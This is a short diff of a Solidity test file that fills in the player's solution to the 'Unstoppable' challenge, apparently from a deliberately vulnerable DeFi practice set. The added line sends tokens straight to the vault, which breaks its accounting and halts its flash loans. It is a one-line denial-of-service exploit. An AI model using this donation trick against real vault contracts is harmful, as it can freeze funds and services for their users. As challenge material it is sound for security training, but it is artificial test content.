@@ -91,7 +91,10 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // balance of the shares that receiver has sent 1 million tokens to vault
+        // console.log(vault.balanceOf(address(deployer)));
+        //! Copied
+        token.transfer(address(vault), 1e18);
     }
 
     /**
